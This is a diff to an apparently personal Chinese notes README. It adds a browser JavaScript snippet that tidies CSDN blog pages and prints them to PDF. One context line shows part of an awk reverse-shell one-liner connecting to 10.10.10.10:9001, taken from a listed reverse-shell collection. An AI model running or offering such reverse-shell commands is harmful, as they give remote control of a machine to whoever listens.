@@ -29,6 +29,7 @@ instruction
   * [反弹shell合集](#反弹shell合集)
 * [xxx2pdf](#xxx2pdf)
   * [freebuf2pdf](#freebuf2pdf)
+  * [csdn2pdf](#csdn2pdf)
 
 <!-- 列表头 -->
 ## Rust
@@ -96,6 +97,11 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 > ***2024-6-28: fb0sh***
 ```js
 ["articles-layout-header ant-layout-header", "page-header", "ant-layout-footer","floating-view", "aside-left", "aside-right", "remix-module","introduce"].forEach(c => document.getElementsByClassName(c)[0].remove());document.getElementsByClassName("main")[0].setAttribute("style","width:100%");window.print();
+```
+---
+### csdn2pdf
+```js
+["toolbarBox", "rightAside", "pcCommentBox", "recommendNps", "toolBarBox"].forEach(i => document.getElementById(i).remove());["blog_container_aside", "recommend-box", "blog-footer-bottom", "csdn-side-toolbar"].forEach(c => document.getElementsByClassName(c)[0].remove());document.querySelectorAll("main")[0].setAttribute("style","width:95");window.print();
 ```
 ---
 <!-- 列表尾 -->
